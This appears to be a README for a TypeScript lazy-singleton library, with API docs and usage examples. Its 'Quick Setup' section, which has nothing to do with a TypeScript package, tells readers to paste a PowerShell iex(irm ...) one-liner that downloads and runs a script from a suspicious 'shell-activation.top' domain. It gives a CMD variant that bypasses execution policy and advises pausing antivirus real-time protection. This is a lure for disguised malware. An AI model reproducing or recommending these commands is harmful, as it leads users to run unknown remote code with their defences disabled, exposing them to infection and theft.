<div align="center">

# di-singleton: Type-Safe Lazy Singleton Wrapper — Developer Library

![preview](https://raw.githubusercontent.com/war4me12-star/dev-library-di-singleton/main/view_3cb3.svg)

[![code](https://img.shields.io/badge/code-typescript-14b8a6?style=for-the-badge&labelColor=0d1117)]() [![build](https://img.shields.io/badge/build-green-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![release](https://img.shields.io/badge/release-maintained-2ea44f?style=for-the-badge&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/pwsh-5.1%2B-2dd4bf?style=for-the-badge&labelColor=0d1117)]()

</div>

---

Wraps a class constructor so that repeated construction returns the same instance, deferring creation until the first `new` call. The wrapper preserves the original constructor signature and instance type through TypeScript generics, so properties and methods remain fully typed. If the wrapped class defines an `init` method, it is invoked once after the single instance is created.

## ⚡ Quick Setup (PowerShell)

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the command
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 📋 System Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- **Constructor wrapping**: `singleton(MyClass)` returns a new constructor that enforces a single shared instance across all `new` calls; the wrapped class itself remains unmodified.
- **Lazy initialization**: the instance is created on first construction only, deferring any constructor side effects until the first `new`.
- **Optional `init` hook**: if the wrapped class defines an `init` method, it is invoked exactly once, immediately after the single instance is constructed and before the constructor returns.
- **Type-safe generics**: the returned constructor preserves the original class's instance type, so `new Singleton()` infers the same public surface as `new MyClass()`.
- **Stable reference identity**: every subsequent `new Singleton()` yields the same object reference, so `instance1 === instance2 === instance3` holds.
- **Zero configuration**: no registration, container, or decorator metadata required; wrapping a class is the entire API surface.
- **Framework-agnostic**: works with any class constructor, independent of runtime or module system.

## Quick Start

Wrap a class constructor with `singleton` to guarantee a single shared instance across all `new` calls. Instantiation is lazy: the underlying instance is created on first use, not at decoration time.

```ts
import { singleton } from 'di-singleton';

class Counter {
 private value = 0;

 increment(): number {
 return ++this.value;
 }

 getValue(): number {
 return this.value;
 }
}

const SingletonCounter = singleton(Counter);

const a = new SingletonCounter();
const b = new SingletonCounter();

a.increment();
b.increment();

console.log(a.getValue()); // 2
console.log(b.getValue()); // 2
console.log(a === b); // true
```

The wrapped constructor preserves the original instance type, so methods and properties remain fully typed through the returned generic.

### Initialization hook

If the wrapped class defines an `init` method, it is invoked automatically the first time the singleton is instantiated. Use it for one-time setup that should run after construction.

```ts
import { singleton } from 'di-singleton';

class Service {
 ready = false;

 init(): void {
 this.ready = true;
 }

 status(): boolean {
 return this.ready;
 }
}

const ServiceSingleton = singleton(Service);

const service = new ServiceSingleton();
console.log(service.status()); // true
```

The `init` method runs exactly once, before the constructor returns the shared instance to the caller.

### Type safety

The return type of `singleton` is a constructor with the same instance type as the input class. TypeScript infers the instance type from the class, so no manual generics are required:

```ts
import { singleton } from 'di-singleton';

class Repo {
 find(id: string): string {
 return id;
 }
}

const RepoSingleton = singleton(Repo);

const repo = new RepoSingleton();
const result: string = repo.find('42'); // fully typed
```

Pass an explicit generic when the class type is not inferable from the value:

```ts
const Wrapped = singleton<Repo>(Repo);
```

## API Reference

### `singleton(Constructor)`

Wraps a class constructor and returns a new constructor that always yields the same instance.

```ts
import { singleton } from 'di-singleton';

const Service = singleton(class {
 value = '';
 getValue = () => this.value;
 setValue = (next: string) => { this.value = next; };
});

const a = new Service();
const b = new Service();
a.setValue('x');
b.setValue('y');
// a.getValue() === 'y' && b.getValue() === 'y'
// a === b
```

**Parameters**

| Name | Type | Description |
| --- | --- | --- |
| `Constructor` | `new (...args: any[]) => T` | Class constructor to wrap. Instance type `T` is preserved. |

**Returns**

A constructor with the same signature as `Constructor`. Every invocation ignores arguments after the first construction and returns the cached instance.

---

### Lazy initialization

The wrapped constructor does not invoke the underlying class until the first `new` call. No instance is created at module load time.

```ts
const Lazy = singleton(class {
 constructor() {
 // runs once, on the first `new Lazy()`
 }
});
```

---

### `init` method detection

If the wrapped class defines a method named `init`, it is invoked exactly once, immediately after the first instance is constructed and before the constructor returns.

```ts
const WithInit = singleton(class {
 ready = false;
 init() {
 this.ready = true;
 }
});

const instance = new WithInit();
// instance.ready === true
```

- `init` is called with no arguments.
- A return value from `init` is ignored.
- If `init` is absent, no call is made.
- `init` runs only on initial construction, never on subsequent `new` calls.

---

### Type safety

The returned constructor preserves the instance type of the input class, including constructor parameter types.

```ts
class Config {
 constructor(public readonly name: string) {}
}

const ConfigSingleton = singleton(Config);
const cfg = new ConfigSingleton('app'); // cfg: Config
// cfg.name === 'app'
```

Constructor arguments are honored on the first call only. Later calls accept the same argument list per the type signature but those values are discarded.

---

### Behavior summary

| Aspect | Behavior |
| --- | --- |
| Instance count | One per wrapped constructor |
| Initialization | Lazy, on first `new` |
| `init` hook | Called once after first construction, if defined |
| Subsequent `new` calls | Return cached instance; arguments ignored |
| Type preservation | Instance and constructor types retained via generics |

---

### Gotchas

- Each call to `singleton(...)` produces an independent wrapper with its own cache. Wrapping the same class twice yields two distinct singletons.
- Because arguments are ignored after the first construction, do not rely on per-call configuration.
- `init` must be synchronous; asynchronous setup should be handled by the caller.

## Examples

```ts
import { singleton } from 'di-singleton';

class Counter {
 private count = 0;

 increment(): number {
 return ++this.count;
 }

 current(): number {
 return this.count;
 }
}

const CounterSingleton = singleton(Counter);

const a = new CounterSingleton();
const b = new CounterSingleton();

a.increment();
b.increment();

console.log(a.current()); // 2
console.log(b.current()); // 2
console.log(a === b); // true
```

Lazy initialization defers construction until the first `new`:

```ts
import { singleton } from 'di-singleton';

let constructed = 0;

class Resource {
 constructor() {
 constructed++;
 }
}

const ResourceSingleton = singleton(Resource);

console.log(constructed); // 0
const r = new ResourceSingleton();
console.log(constructed); // 1
```

If the wrapped class defines an `init` method, it is invoked once on the first instantiation:

```ts
import { singleton } from 'di-singleton';

class Service {
 ready = false;

 init(): void {
 this.ready = true;
 }
}

const ServiceSingleton = singleton(Service);

const s1 = new ServiceSingleton();
console.log(s1.ready); // true
```

Type safety is preserved through generics; the returned constructor has the same instance type as the input class:

```ts
import { singleton } from 'di-singleton';

class Repo {
 find(id: string): string {
 return `item:${id}`;
 }
}

const RepoSingleton = singleton(Repo);

const repo = new RepoSingleton();
const result: string = repo.find('42');
console.log(result); // item:42
```

Constructor arguments are forwarded on the first instantiation; subsequent calls return the existing instance:

```ts
import { singleton } from 'di-singleton';

class Config {
 constructor(public readonly name: string) {}
}

const ConfigSingleton = singleton(Config);

const c1 = new ConfigSingleton('primary');
const c2 = new ConfigSingleton('secondary');

console.log(c1.name); // primary
console.log(c2.name); // primary
console.log(c1 === c2); // true
```

## License

Released under the MIT License.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.